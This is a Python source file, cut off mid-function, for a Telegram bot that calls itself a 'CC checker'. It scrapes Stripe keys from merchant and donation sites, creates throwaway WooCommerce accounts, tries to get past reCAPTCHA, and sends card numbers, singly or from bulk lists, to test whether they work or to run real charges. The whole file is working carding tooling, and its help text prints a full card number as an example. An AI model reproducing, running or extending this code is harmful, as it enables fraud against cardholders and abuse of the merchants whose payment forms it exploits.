import os
import re
import io
import json
import asyncio
import logging
import requests
import random
import string
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, urljoin
from requests_toolbelt.multipart.encoder import MultipartEncoder
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
if not TOKEN:
    raise RuntimeError("TELEGRAM_BOT_TOKEN environment variable is not set.")

USER_AGENTS = [
    'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; Redmi Note 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
]

user_sites: dict[int, dict] = {}
stop_flags: set[int] = set()


def make_headers(ua: str, origin: str = None, referer: str = None) -> dict:
    h = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'User-Agent': ua,
        'Upgrade-Insecure-Requests': '1',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }
    if origin:
        h['Origin'] = origin
    if referer:
        h['Referer'] = referer
    return h


def captcha_detected(text: str) -> bool:
    patterns = [r'captcha', r'recaptcha', r'g-recaptcha', r'hcaptcha',
                r'data-sitekey', r'cf-chl-captcha', r'cloudflare',
                r'are you human', r'verify you are human']
    text = text.lower()
    return any(re.search(p, text) for p in patterns)


def recaptcha_bypass(sitekey: str) -> str | None:
    origin_encoded = "aHR0cHM6Ly93d3cueW91cnNpdGUuY29t"
    anchor_url = (
        f"https://www.google.com/recaptcha/api2/anchor?"
        f"ar=1&k={sitekey}&co={origin_encoded}&hl=tr&v=...&size=invisible"
    )
    reload_url = f"https://www.google.com/recaptcha/api2/reload?k={sitekey}"
    req_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
    }
    try:
        resp = requests.get(anchor_url, headers=req_headers, timeout=12)
        resp.raise_for_status()
        token_m = re.search(r'value=["\']([^"\']+)["\']', resp.text)
        if not token_m:
            return None
        token = token_m.group(1)
        parsed = urlparse(anchor_url)
        params = parse_qs(parsed.query)
        post_data = {'v': params.get('v', [''])[0], 'reason': 'q', 'c': token,
                     'k': sitekey, 'co': params.get('co', [''])[0], 'hl': 'tr', 'size': 'invisible'}
        ph = req_headers.copy()
        ph.update({"Referer": resp.url, "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://www.google.com"})
        resp2 = requests.post(reload_url, headers=ph, data=post_data, timeout=15)
        resp2.raise_for_status()
        m = re.search(r'\["rresp","([^"]+)"', resp2.text)
        return m.group(1) if m else None
    except Exception as e:
        logger.error(f"Recaptcha bypass error: {e}")
        return None


def parse_card(raw: str) -> tuple[str, str, str, str] | None:
    raw = raw.strip()
    parts = re.split(r'[|/ ]+', raw)
    parts = [p.strip() for p in parts if p.strip()]
    if len(parts) != 4:
        return None
    number, month, year, cvv = parts
    number = re.sub(r'\D', '', number)
    month = month.zfill(2)
    year = year[-2:] if len(year) == 4 else year.zfill(2)
    if not (13 <= len(number) <= 19):
        return None
    return number, month, year, cvv


def stripe_create_pm(session: requests.Session, pks: str, acct: str,
                     number: str, month: str, year: str, cvv: str,
                     email: str, site: str) -> dict:
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    data = (
        f'billing_details[name]=User&billing_details[email]={email}'
        f'&billing_details[address][country]=TR&type=card'
        f'&card[number]={number}&card[cvc]={cvv}&card[exp_year]={year}&card[exp_month]={month}'
        f'&allow_redisplay=unspecified'
        f'&payment_user_agent=stripe.js%2F065b474d33%3B+stripe-js-v3%2F065b474d33'
        f'&referrer={site}&time_on_page=120000'
        f'&guid=beb24868-9013-41ea-9964-791dbbc35582418cf'
        f'&muid=929c4143-a270-4912-bf4d-9d1ac8b9e044ed0431'
        f'&sid=c9b88b93-0a69-4079-9183-2e06ee66b80198b2f1'
        f'&key={pks}'
    )
    if acct:
        data += f'&_stripe_account={acct}'
    resp = session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=20)
    return resp.json()


def detect_site(url: str) -> dict | str:
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url

    UA = random.choice(USER_AGENTS)
    session = requests.Session()
    headers = make_headers(UA)

    try:
        resp = session.get(url, headers=headers, timeout=15)
        if resp.status_code != 200:
            return f"❌ Site returned HTTP {resp.status_code}"
        html = resp.text
    except requests.exceptions.ConnectionError:
        return f"❌ Could not connect to {url}"
    except requests.exceptions.Timeout:
        return f"❌ Connection timed out"
    except Exception as e:
        return f"❌ Error: {str(e)}"

    parsed = urlparse(url)
    base_url = f"{parsed.scheme}://{parsed.netloc}"

    if re.search(r'"createSetupIntentNonce"', html):
        pks_m = re.search(r'"publishableKey"\s*:\s*"([^"]+)"', html)
        acct_m = re.search(r'"accountId"\s*:\s*"([^"]+)"', html)
        nonce_m = re.search(r'"createSetupIntentNonce"\s*:\s*"([^"]+)"', html)
        if pks_m and acct_m and nonce_m:
            return {
                'type': 'wcpay_direct',
                'url': url,
                'base_url': base_url,
                'session': session,
                'UA': UA,
                'pks': pks_m.group(1),
                'acct': acct_m.group(1),
                'nonce': nonce_m.group(1),
                'email': ''.join(random.choices(string.ascii_lowercase, k=6)) + "@gmail.com",
            }

    woo_nonce_m = re.search(r'"woocommerce-register-nonce"', html)
    if woo_nonce_m or ('woocommerce' in html.lower() and parsed.path in ('/', '')):
        account_url = f"{base_url}/my-account/"
        try:
            resp2 = session.get(account_url, headers=headers, timeout=15)
            if resp2.status_code == 200:
                soup = BeautifulSoup(resp2.text, 'html.parser')
                nonce_tag = soup.find("input", {"name": "woocommerce-register-nonce"})
                if nonce_tag and 'value' in nonce_tag.attrs:
                    return {
                        'type': 'wcpay_register',
                        'url': url,
                        'base_url': base_url,
                        'session': session,
                        'UA': UA,
                        'reg_nonce': nonce_tag['value'],
                        'email': ''.join(random.choices(string.ascii_lowercase, k=6)) + "@gmail.com",
                        'password': ''.join(random.choices(string.ascii_letters + string.digits, k=10)),
                    }
        except Exception:
            pass

    wpforms_m = re.search(r'"publishable_key"\s*:\s*"(pk_(?:live|test)_[A-Za-z0-9]+)"', html)
    if wpforms_m:
        form_m = re.search(r'wpforms-form-(\d+)', html)
        form_id = form_m.group(1) if form_m else None
        nonce_m = re.search(r'"wpforms"\s*:\s*\{[^}]*"nonce"\s*:\s*"([^"]+)"', html)
        wpf_nonce = nonce_m.group(1) if nonce_m else None
        if not wpf_nonce:
            nonce_m2 = re.search(r'wpforms\[nonce\][^"]*"([a-f0-9]{10})"', html)
            wpf_nonce = nonce_m2.group(1) if nonce_m2 else None
        return {
            'type': 'wpforms',
            'url': url,
            'base_url': base_url,
            'session': session,
            'UA': UA,
            'pks': wpforms_m.group(1),
            'acct': '',
            'form_id': form_id,
            'nonce': wpf_nonce,
            'email': ''.join(random.choices(string.ascii_lowercase, k=6)) + "@gmail.com",
        }

    pk_m = re.search(r'pk_(?:live|test)_[A-Za-z0-9]+', html)
    if pk_m:
        acct_m = re.search(r'"accountId"\s*:\s*"([^"]+)"', html)
        return {
            'type': 'generic',
            'url': url,
            'base_url': base_url,
            'session': session,
            'UA': UA,
            'pks': pk_m.group(0),
            'acct': acct_m.group(1) if acct_m else '',
            'email': ''.join(random.choices(string.ascii_lowercase, k=6)) + "@gmail.com",
        }

    return "❌ No Stripe integration detected on this page."


def setup_wcpay_register(ctx: dict) -> dict | str:
    session = ctx['session']
    base_url = ctx['base_url']
    UA = ctx['UA']
    email = ctx['email']
    password = ctx['password']
    reg_nonce = ctx['reg_nonce']

    headers = make_headers(UA, origin=base_url, referer=f'{base_url}/my-account/')
    headers['Cache-Control'] = 'no-cache'
    headers['Pragma'] = 'no-cache'

    data = {
        'email': email, 'password': password,
        'wc_order_attribution_source_type': 'typein',
        'wc_order_attribution_referrer': '(none)',
        'wc_order_attribution_utm_campaign': '(none)',
        'wc_order_attribution_utm_source': '(direct)',
        'wc_order_attribution_utm_medium': '(none)',
        'wc_order_attribution_utm_content': '(none)',
        'wc_order_attribution_utm_id': '(none)',
        'wc_order_attribution_utm_term': '(none)',
        'wc_order_attribution_utm_source_platform': '(none)',
        'wc_order_attribution_utm_creative_format': '(none)',
        'wc_order_attribution_utm_marketing_tactic': '(none)',
        'wc_order_attribution_session_entry': f'{base_url}/my-account/add-payment-method/',
        'wc_order_attribution_session_start_time': '2026-01-25 17:24:57',
        'wc_order_attribution_session_pages': '5',
        'wc_order_attribution_session_count': '1',
        'wc_order_attribution_user_agent': UA,
        'woocommerce-register-nonce': reg_nonce,
        '_wp_http_referer': '/my-account/',
        'register': 'Register',
    }

    try:
        resp = session.post(f'{base_url}/my-account/', headers=headers, data=data, timeout=20)
        html = resp.text

        if captcha_detected(html):
            sk_m = re.search(r'data-sitekey=["\']([^"\']+)["\']', html, re.IGNORECASE)
            if sk_m:
                g_token = recaptcha_bypass(sk_m.group(1))
                if g_token:
                    data['g-recaptcha-response'] = g_token
                    resp = session.post(f'{base_url}/my-account/', headers=headers, data=data, timeout=20)
                    html = resp.text
                else:
                    return "❌ CAPTCHA bypass failed"
            else:
                return "❌ CAPTCHA detected but sitekey not found"

        pay_headers = make_headers(UA, referer=f'{base_url}/my-account/payment-methods/')
        pay_headers['Cache-Control'] = 'no-cache'
        resp2 = session.get(f'{base_url}/my-account/add-payment-method/', headers=pay_headers, timeout=15)
        html2 = resp2.text

        pks_m = re.search(r'"publishableKey"\s*:\s*"([^"]+)"', html2)
        acct_m = re.search(r'"accountId"\s*:\s*"([^"]+)"', html2)
        nonce_m = re.search(r'"createSetupIntentNonce"\s*:\s*"([^"]+)"', html2)

        if not pks_m or not acct_m or not nonce_m:
            return "❌ Stripe keys not found after registration. Site may not use WooCommerce Payments."

        ctx['pks'] = pks_m.group(1)
        ctx['acct'] = acct_m.group(1)
        ctx['nonce'] = nonce_m.group(1)
        ctx['type'] = 'wcpay_direct'
        return ctx

    except Exception as e:
        return f"❌ Error during site setup: {str(e)}"


def refresh_wcpay_nonce(ctx: dict) -> str | None:
    session = ctx['session']
    base_url = ctx['base_url']
    UA = ctx['UA']
    headers = make_headers(UA, referer=f'{base_url}/my-account/payment-methods/')
    try:
        resp = session.get(f'{base_url}/my-account/add-payment-method/', headers=headers, timeout=15)
        nonce_m = re.search(r'"createSetupIntentNonce"\s*:\s*"([^"]+)"', resp.text)
        return nonce_m.group(1) if nonce_m else None
    except Exception:
        return None


def do_wcpay_setup_intent(ctx: dict, pm_id: str) -> dict:
    session = ctx['session']
    base_url = ctx['base_url']
    UA = ctx['UA']
    nonce = ctx['nonce']

    multipart_data = MultipartEncoder({
        'action': (None, 'create_setup_intent'),
        'wcpay-payment-method': (None, pm_id),
        '_ajax_nonce': (None, nonce),
    })
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Content-Type': multipart_data.content_type,
        'Origin': base_url,
        'Referer': f'{base_url}/my-account/add-payment-method/',
        'User-Agent': UA,
    }
    resp = session.post(f'{base_url}/wp-admin/admin-ajax.php', headers=headers, data=multipart_data, timeout=20)
    return resp.json()


def fresh_session(UA: str) -> requests.Session:
    s = requests.Session()
    s.headers.update({'User-Agent': UA})
    return s


def fetch_wpforms_page_data(url: str, UA: str) -> dict | str:
    s = fresh_session(UA)
    try:
        resp = s.get(url, timeout=15)
        if resp.status_code != 200:
            return f"❌ Site returned HTTP {resp.status_code}"
        html = resp.text
        soup = BeautifulSoup(html, 'html.parser')

        form_m = re.search(r'wpforms-form-(\d+)', html)
        form_id = form_m.group(1) if form_m else None

        form_el = None
        token = None
        token_time = None
        hidden_fields = {}
        post_id = None

        if form_id:
            form_el = soup.find('form', {'id': f'wpforms-form-{form_id}'})

        if form_el:
            token = form_el.get('data-token')
            token_time = form_el.get('data-token-time')
            for inp in form_el.find_all('input', {'type': 'hidden'}):
                name = inp.get('name', '')
                val = inp.get('value', '')
                if name:
                    hidden_fields[name] = val
            post_id = hidden_fields.get('page_id')

        if not post_id:
            post_id_m = re.search(r'"page_id"\s*:\s*"?(\d+)"?', html)
            post_id = post_id_m.group(1) if post_id_m else '932'

        pks_m = re.search(r'"publishable_key"\s*:\s*"(pk_(?:live|test)_[A-Za-z0-9]+)"', html)
        pks = pks_m.group(1) if pks_m else None

        if not token:
            return "❌ Could not find WPForms token in page HTML"

        return {
            'session': s,
            'form_id': form_id,
            'post_id': post_id,
            'token': token,
            'token_time': token_time,
            'hidden_fields': hidden_fields,
            'pks': pks,
        }
    except requests.exceptions.ConnectionError:
        return "❌ Could not connect to site"
    except Exception as e:
        return f"❌ Error: {str(e)}"


def do_wpforms_charge(ctx: dict, pm_id: str, amount: str, name: str, email: str, page_data: dict) -> dict:
    base_url = ctx['base_url']
    url = ctx['url']
    UA = ctx['UA']
    s = page_data['session']
    form_id = page_data.get('form_id') or ctx.get('form_id', '942')
    post_id = page_data.get('post_id', '932')
    token = page_data.get('token', '')
    token_time = page_data.get('token_time', '')
    hidden_fields = page_data.get('hidden_fields', {})

    phone = f"+1{''.join(random.choices(string.digits, k=10))}"
    first, last = (name.split(' ', 1) + ['User'])[:2]

    ajax_headers = {
        'User-Agent': UA,
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': base_url,
        'Referer': url,
    }

    data = dict(hidden_fields)
    data.update({
        'action': 'wpforms_submit',
        f'wpforms[fields][23][]': 'One-time',
        f'wpforms[fields][24]': '5',
        f'wpforms[fields][10]': str(amount),
        f'wpforms[fields][3][first]': first,
        f'wpforms[fields][3][last]': last,
        f'wpforms[fields][5]': email,
        f'wpforms[fields][18]': phone,
        f'wpforms[fields][20][address1]': '123 Main St',
        f'wpforms[fields][20][city]': 'New York',
        f'wpforms[fields][20][state]': 'NY',
        f'wpforms[fields][20][postal]': '10001',
        f'wpforms[fields][20][country]': 'US',
        f'wpforms[fields][12]': '0',
        f'wpforms[fields][33]': '0',
        f'wpforms[stripe-credit-card-hidden-input-{form_id}]': pm_id,
        f'wpforms[stripe-credit-card-cardname]': name,
        f'wpforms[id]': form_id,
        'wpforms[token]': token or '',
        'wpforms[token_time]': token_time or '',
        'page_title': 'Donate',
        'page_url': url,
        'page_id': post_id or '932',
        f'wpforms[post_id]': post_id or '932',
    })

    try:
        resp = s.post(f'{base_url}/wp-admin/admin-ajax.php', headers=ajax_headers, data=data, timeout=25)
        return resp.json()
    except Exception as e:
        return {'success': False, 'data': {'message': str(e)}}


def check_card_auth(ctx: dict, number: str, month: str, year: str, cvv: str) -> dict:
    return check_card_on_ctx(ctx, number, month, year, cvv)


def check_card_charge(ctx: dict, number: str, month: str, year: str, cvv: str, amount: str) -> dict:
    card_full = f"{number}|{month}|{year}|{cvv}"
    pks = ctx['pks']
    acct = ctx.get('acct', '')
    site = ctx['url']
    UA = ctx['UA']
    email = ''.join(random.choices(string.ascii_lowercase, k=6)) + "@gmail.com"

    base = {
        'card': card_full,
        'pm_id': None,
        'brand': None,
        'funding': None,
        'country': None,
        'cvc_check': None,
        'site': site,
        'site_type': ctx['type'],
        'amount': amount,
        'check_type': 'charge',
    }

    try:
        tmp_session = fresh_session(UA)
        stripe_json = stripe_create_pm(tmp_session, pks, acct, number, month, year, cvv, email, site)

        if 'id' not in stripe_json:
            err = stripe_json.get('error', {})
            code = err.get('code', '')
            msg = err.get('message', 'Unknown Stripe error')
            base.update({'status': 'declined', 'message': f"{code}: {msg}" if code else msg})
            return base

        pm_id = stripe_json['id']
        card_info = stripe_json.get('card', {})
        name = (
            ''.join(random.choices(string.ascii_uppercase, k=1)) +
            ''.join(random.choices(string.ascii_lowercase, k=5)) + ' ' +
            ''.join(random.choices(string.ascii_uppercase, k=1)) +
            ''.join(random.choices(string.ascii_lowercase, k=5))
        )
        base.update({
            'pm_id': pm_id,
            'brand': card_info.get('brand', '').title(),
            'funding': card_info.get('funding', '').title(),
            'country': card_info.get('country', ''),
            'cvc_check': card_info.get('checks', {}).get('cvc_check', ''),
        })

        if ctx['type'] == 'wpforms':
            page_data = fetch_wpforms_page_data(site, UA)
            if isinstance(page_data, str):
                base.update({'status': 'declined', 'message': page_data})
                return base

            result = do_wpforms_charge(ctx, pm_id, amount, name, email, page_data)
            success = result.get('success', False)
            if success:
                base.update({'status': 'charged', 'message': f'${amount} charged'})
            else:
                data_obj = result.get('data', {})
                if isinstance(data_obj, dict):
                    gen_err = data_obj.get('errors', {}).get('general', {}).get('header', '')
                    field_err = data_obj.get('errors', {}).get('field', {})
                    msg = re.sub(r'<[^>]+>', '', gen_err).strip() if gen_err else ''
                    if not msg and field_err:
                        msg = ', '.join(str(v) for v in field_err.values())[:150]
                    if not msg:
                        msg = str(data_obj)[:150]
                else:
                    msg = str(data_obj)[:150]
                base.update({'status': 'declined', 'message': msg})

        elif ctx['type'] == 'wcpay_direct':
            new_ctx = dict(ctx)
            new_nonce = refresh_wcpay_nonce(new_ctx)
            if new_nonce:
                new_ctx['nonce'] = new_nonce
            try:
                ajax_json = do_wcpay_setup_intent(new_ctx, pm_id)
                success = ajax_json.get('success', False)
                d = ajax_json.get('data', {})
                intent_status = d.get('status', '') if isinstance(d, dict) else ''
                if success or intent_status in ('requires_payment_method', 'succeeded', 'requires_action', 'processing'):
                    base.update({'status': 'charged', 'message': intent_status or 'Charged'})
                else:
                    base.update({'status': 'declined', 'message': str(d)[:150]})
            except Exception as e:
                base.update({'status': 'declined', 'message': str(e)[:100]})
        else:
            base.update({'status': 'declined', 'message': 'Charge not supported for this site type'})

        return base

    except Exception as e:
        logger.error(f"Charge error: {e}", exc_info=True)
        base.update({'status': 'error', 'message': str(e)[:100]})
        return base


def check_card_on_ctx(ctx: dict, number: str, month: str, year: str, cvv: str) -> dict:
    card_full = f"{number}|{month}|{year}|{cvv}"
    card_masked = f"{number[:4]}****{number[-4:]}|{month}|{year}|{cvv}"
    email = ''.join(random.choices(string.ascii_lowercase, k=6)) + "@gmail.com"
    UA = ctx.get('UA', random.choice(USER_AGENTS))
    pks = ctx['pks']
    acct = ctx.get('acct', '')
    site = ctx['url']
    tmp_session = fresh_session(UA)

    base = {
        'card': card_full,
        'card_masked': card_masked,
        'number': number,
        'month': month,
        'year': year,
        'cvv': cvv,
        'pm_id': None,
        'brand': None,
        'funding': None,
        'country': None,
        'cvc_check': None,
        'site': site,
        'site_type': ctx['type'],
    }

    try:
        stripe_json = stripe_create_pm(tmp_session, pks, acct, number, month, year, cvv, email, site)

        if 'id' not in stripe_json:
            err = stripe_json.get('error', {})
            code = err.get('code', '')
            msg = err.get('message', 'Unknown Stripe error')
            base.update({'status': 'declined', 'message': f"{code}: {msg}" if code else msg})
            return base

        pm_id = stripe_json['id']
        card_info = stripe_json.get('card', {})
        base.update({
            'pm_id': pm_id,
            'brand': card_info.get('brand', '').title(),
            'funding': card_info.get('funding', '').title(),
            'country': card_info.get('country', ''),
            'cvc_check': card_info.get('checks', {}).get('cvc_check', ''),
            'last4': card_info.get('last4', number[-4:]),
        })

        if ctx['type'] == 'wcpay_direct':
            new_nonce = refresh_wcpay_nonce(ctx)
            if new_nonce:
                ctx['nonce'] = new_nonce
            try:
                ajax_json = do_wcpay_setup_intent(ctx, pm_id)
                success = ajax_json.get('success', False)
                data = ajax_json.get('data', {})
                intent_status = data.get('status', '') if isinstance(data, dict) else ''
                if success or intent_status in ('requires_payment_method', 'succeeded', 'requires_action', 'processing'):
                    base.update({'status': 'approved', 'message': intent_status or 'Setup intent created'})
                    return base
                else:
                    msg = str(data)[:200] if data else str(ajax_json)[:200]
                    base.update({'status': 'declined', 'message': msg})
                    return base
            except Exception as e:
                base.update({'status': 'approved', 'message': 'PM created'})
                return base

        base.update({'status': 'approved', 'message': 'Payment method created'})
        return base

    except requests.exceptions.Timeout:
        base.update({'status': 'error', 'message': 'Request timed out'})
        return base
    except Exception as e:
        logger.error(f"Card check error: {e}", exc_info=True)
        base.update({'status': 'error', 'message': str(e)[:150]})
        return base


COUNTRY_FLAG = {
    'US': '🇺🇸', 'GB': '🇬🇧', 'CA': '🇨🇦', 'AU': '🇦🇺', 'DE': '🇩🇪',
    'FR': '🇫🇷', 'IT': '🇮🇹', 'ES': '🇪🇸', 'NL': '🇳🇱', 'TR': '🇹🇷',
    'IN': '🇮🇳', 'BR': '🇧🇷', 'MX': '🇲🇽', 'JP': '🇯🇵', 'CN': '🇨🇳',
    'RU': '🇷🇺', 'PK': '🇵🇰', 'NG': '🇳🇬', 'ZA': '🇿🇦', 'SG': '🇸🇬',
    'AE': '🇦🇪', 'SA': '🇸🇦', 'PH': '🇵🇭', 'ID': '🇮🇩', 'MY': '🇲🇾',
    'TH': '🇹🇭', 'KR': '🇰🇷', 'AR': '🇦🇷', 'CO': '🇨🇴', 'EG': '🇪🇬',
}

BRAND_ICON = {
    'Visa': '💳 Visa', 'Mastercard': '💳 Mastercard', 'Amex': '💳 Amex',
    'Discover': '💳 Discover', 'Diners': '💳 Diners', 'Jcb': '💳 JCB',
    'Unionpay': '💳 UnionPay',
}

CVC_ICON = {'pass': '✅', 'fail': '❌', 'unavailable': '➖', 'unchecked': '❓'}


def format_card_result(result: dict) -> str:
    status = result['status']
    msg = result.get('message', '')
    pm_id = result.get('pm_id', '')
    card = result.get('card', '')
    brand = result.get('brand') or ''
    funding = result.get('funding') or ''
    country = result.get('country') or ''
    cvc_check = result.get('cvc_check') or ''
    site = result.get('site', '')
    site_type = result.get('site_type', '')

    check_type = result.get('check_type', 'auth')
    amount = result.get('amount', '')

    if status == 'approved':
        header = "✅ <b>APPROVED</b> [AUTH]"
    elif status == 'charged':
        header = f"💰 <b>CHARGED</b> [${amount}]" if amount else "💰 <b>CHARGED</b>"
    elif status == 'declined':
        header = "❌ <b>DECLINED</b>"
    else:
        header = "⚠️ <b>ERROR</b>"

    flag = COUNTRY_FLAG.get(country, '🌐')
    brand_label = BRAND_ICON.get(brand, f'💳 {brand}') if brand else '💳'
    cvc_icon = CVC_ICON.get(cvc_check, '❓')
    type_labels = {'wcpay_direct': 'WooCommerce Pay', 'wpforms': 'WPForms/Stripe', 'generic': 'Stripe'}
    site_label = type_labels.get(site_type, site_type)

    lines = [header, ""]
    lines.append(f"💳 <b>Card:</b> <code>{card}</code>")
    if brand:
        lines.append(f"🏦 <b>Brand:</b> {brand_label}")
    if funding:
        lines.append(f"📋 <b>Type:</b> {funding}")
    if country:
        lines.append(f"🌍 <b>Country:</b> {flag} {country}")
    if cvc_check:
        lines.append(f"🔐 <b>CVC Check:</b> {cvc_icon} {cvc_check.title()}")
    if pm_id:
        lines.append(f"🆔 <b>PM ID:</b> <code>{pm_id}</code>")
    lines.append(f"🌐 <b>Gateway:</b> {site_label}")
    if msg:
        lines.append(f"📝 <b>Status:</b> {msg}")

    return "\n".join(lines)


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    await update.message.reply_html(
        f"Hi <b>{user.first_name}</b>! I'm your Stripe/WooCommerce CC checker bot.\n\n"
        "Use /help to see available commands."
    )


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_html(
        "<b>Commands:</b>\n"
        "/setsite &lt;url&gt; — Set target site (auto-detects type)\n"
        "/site — Show currently set site\n"
        "/check &lt;url&gt; — Test site compatibility\n\n"
        "<b>Card Checks:</b>\n"
        "/cc number|month|year|cvv — Auth check (verify card is live)\n"
        "/auth number|month|year|cvv — Same as /cc (auth only, no charge)\n"
        "/charge &lt;amount&gt; number|month|year|cvv — Real charge on card\n\n"
        "<b>Mass check (send .txt file):</b>\n"
        "One card per line: <code>number|month|year|cvv</code>\n"
        "/stop — Cancel a running mass check\n\n"
        "<b>Supported sites:</b>\n"
        "• WooCommerce Payments\n"
        "• WPForms + Stripe\n"
        "• Any Stripe-powered site\n\n"
        "<b>Examples:</b>\n"
        "<code>/cc 5218071175156668|02|26|574</code>\n"
        "<code>/charge 1.00 5218071175156668|02|26|574</code>"
    )


async def setsite_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not context.args:
        await update.message.reply_text("Usage: /setsite https://example.com/donate/")
        return

    url = context.args[0].strip()
    msg = await update.message.reply_text(f"🔍 Detecting site type for {url}...")

    loop = asyncio.get_event_loop()
    result = await loop.run_in_executor(None, detect_site, url)

    if isinstance(result, str):
        await msg.edit_text(result)
        return

    if result['type'] == 'wcpay_register':
        await msg.edit_text("⚙️ WooCommerce site detected, registering account...")
        result = await loop.run_in_executor(None, setup_wcpay_register, result)
        if isinstance(result, str):
            await msg.edit_text(result)
            return

    user_id = update.effective_user.id
    user_sites[user_id] = result

    type_labels = {
        'wcpay_direct': '🛒 WooCommerce Payments',
        'wpforms': '📝 WPForms + Stripe',
        'generic': '💳 Generic Stripe',
    }
    type_label = type_labels.get(result['type'], result['type'])
    pk_preview = result['pks'][:25] + '...'

    await msg.edit_text(
        f"✅ Site configured!\n"
        f"🌐 {url}\n"
        f"Type: {type_label}\n"
        f"PK: {pk_preview}\n\n"
        f"Now use /cc or send a .txt file to check cards.",
        parse_mode='HTML'
    )


async def site_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    ctx = user_sites.get(user_id)
    if ctx:
        type_labels = {'wcpay_direct': 'WooCommerce Payments', 'wpforms': 'WPForms + Stripe', 'generic': 'Generic Stripe'}
        await update.message.reply_html(
            f"🌐 Site: <code>{ctx['url']}</code>\n"
            f"Type: {type_labels.get(ctx['type'], ctx['type'])}"
        )
    else:
        await update.message.reply_text("No site set. Use /setsite https://example.com")


async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not context.args:
        await update.message.reply_text("Usage: /check https://example.com")
        return

    url = context.args[0].strip()
    msg = await update.message.reply_text(f"🔍 Testing site: {url}...")

    loop = asyncio.get_event_loop()
    result = await loop.run_in_executor(None, detect_site, url)

    if isinstance(result, str):
        await msg.edit_text(result)
        return

    type_labels = {'wcpay_direct': 'WooCommerce Payments', 'wcpay_register': 'WooCommerce (needs registration)', 'wpforms': 'WPForms + Stripe', 'generic': 'Generic Stripe'}
    await msg.edit_text(
        f"✅ Site compatible!\n"
        f"Type: {type_labels.get(result['type'], result['type'])}\n"
        f"PK: {result['pks'][:30]}...\n\n"
        f"Use /setsite {url} to start checking cards."
    )


async def cc_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    ctx = user_sites.get(user_id)

    if not ctx:
        await update.message.reply_text("❌ No site set. Use /setsite https://example.com first.")
        return

    if not context.args:
        await update.message.reply_text("Usage: /cc number|month|year|cvv\nExample: /cc 5218071175156668|02|26|574")
        return

    raw = " ".join(context.args)
    parsed = parse_card(raw)
    if not parsed:
        await update.message.reply_text("❌ Invalid card format. Use: number|month|year|cvv")
        return

    number, month, year, cvv = parsed
    card_display = f"{number[:4]}****{number[-4:]}|{month}|{year}|{cvv}"
    status_msg = await update.message.reply_text(f"🔍 Checking {card_display}...")

    loop = asyncio.get_event_loop()
    result = await loop.run_in_executor(None, check_card_on_ctx, ctx, number, month, year, cvv)

    await status_msg.delete()
    await update.message.reply_html(format_card_result(result))


async def auth_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    ctx = user_sites.get(user_id)

    if not ctx:
        await update.message.reply_text("❌ No site set. Use /setsite https://example.com first.")
        return

    if not context.args:
        await update.message.reply_text("Usage: /auth number|month|year|cvv\nExample: /auth 5218071175156668|02|26|574")
        return

    raw = " ".join(context.args)
    parsed = parse_card(raw)
    if not parsed:
        await update.message.reply_text("❌ Invalid card format. Use: number|month|year|cvv")
        return

    number, month, year, cvv = parsed
    card_display = f"{number[:4]}****{number[-4:]}|{month}|{year}|{cvv}"
    status_msg = await update.message.reply_text(f"🔐 Auth checking {card_display}...")

    loop = asyncio.get_event_loop()
    result = await loop.run_in_executor(None, check_card_auth, ctx, number, month, year, cvv)

    await status_msg.delete()
    await update.message.reply_html(format_card_result(result))


async def charge_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    ctx = user_sites.get(user_id)

    if not ctx:
        await update.message.reply_text("❌ No site set. Use /setsite https://example.com first.")
        return

    if not context.args or len(context.args) < 2:
        await update.message.reply_text(
